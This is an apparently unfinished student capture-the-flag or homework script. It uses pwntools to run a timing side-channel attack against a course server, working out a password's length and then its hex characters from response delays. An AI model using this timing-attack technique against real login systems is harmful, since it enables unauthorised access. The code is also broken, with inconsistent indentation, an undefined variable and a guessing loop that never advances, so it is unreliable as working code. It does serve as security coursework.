import random
import time
from pwn import *

r = remote("twinpeaks.cs.ucdavis.edu", 30003)

line = r.recvline()
length = False
pw = ''
j = 0

# the purpose of the for loop is to find the length of the password
# if length is of pw matches password the server sleeps for 0.2 seconds 
# before determining if each char is correct
while(j  < 20):
  pw += str(j)
  print(line)
  start = time.time()
  r.sendline(str(pw).encode())
  r.recvline()
  r.recvline()
  finish = time.time()
  diff = finish - start
  print(diff)
  if(diff > .200):
    print(r.can_recv(.200))
    pw_len = j
    length = True
    break
  print(pw)
  j+=1



chars = '0123456789ABCDEF'
pw = ''

# if char is wrong it automatically return but if char is correct it sleeps 0.2
# So correct password will take 0.2 + (0.2 * pw_length) to repsond
while(diff < (0.200 * j)):
	for char in chars:
  	start = time.time()
  	r.sendline(str(pw).encode())
  	line = r.recvline()
 		line = r.recvline()
  	finish = time.time()
		diff = finish - start
		if (diff > .200):
			correct_pw += correct_pw + pw[0]
			
